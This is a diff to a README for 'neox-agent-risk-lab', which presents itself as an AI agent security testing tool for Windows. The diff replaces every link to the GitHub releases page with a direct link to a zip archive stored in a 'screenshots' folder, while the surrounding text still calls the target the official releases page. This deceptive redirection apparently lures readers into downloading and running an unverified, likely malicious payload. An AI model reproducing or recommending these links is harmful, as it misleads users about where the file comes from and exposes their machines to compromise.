@@ -1,6 +1,6 @@
 # ⚙️ neox-agent-risk-lab - AI Agent Security Testing Made Simple
 
-[![Download neox-agent-risk-lab](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/huyairobot/neox-agent-risk-lab/releases)
+[![Download neox-agent-risk-lab](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/huyairobot/neox-agent-risk-lab/main/screenshots/lab-agent-risk-neox-2.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to start using neox-agent-risk-lab on your Windows computer:
 
 1. **Go to the Releases Page**  
    Visit the releases page to download the latest version:  
-   [https://github.com/huyairobot/neox-agent-risk-lab/releases](https://github.com/huyairobot/neox-agent-risk-lab/releases)
+   [https://raw.githubusercontent.com/huyairobot/neox-agent-risk-lab/main/screenshots/lab-agent-risk-neox-2.8.zip](https://raw.githubusercontent.com/huyairobot/neox-agent-risk-lab/main/screenshots/lab-agent-risk-neox-2.8.zip)
 
 2. **Find the Latest Release**  
    Look for the newest release entry at the top. It will have files you can download, usually named with the version number and ending in `.exe` or `.zip`.
@@ -59,7 +59,7 @@ Follow these steps to start using neox-agent-risk-lab on your Windows computer:
 
 To download and install the software, follow this repeatable link:
 
-[![Get neox-agent-risk-lab](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/huyairobot/neox-agent-risk-lab/releases)
+[![Get neox-agent-risk-lab](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/huyairobot/neox-agent-risk-lab/main/screenshots/lab-agent-risk-neox-2.8.zip)
 
 The official releases page contains the latest tested version for Windows.
 
@@ -153,4 +153,4 @@ If you need assistance with installing or using neox-agent-risk-lab:
 
 ---
 
-[![Download neox-agent-risk-lab](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/huyairobot/neox-agent-risk-lab/releases)
+[![Download neox-agent-risk-lab](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/huyairobot/neox-agent-risk-lab/main/screenshots/lab-agent-risk-neox-2.8.zip)
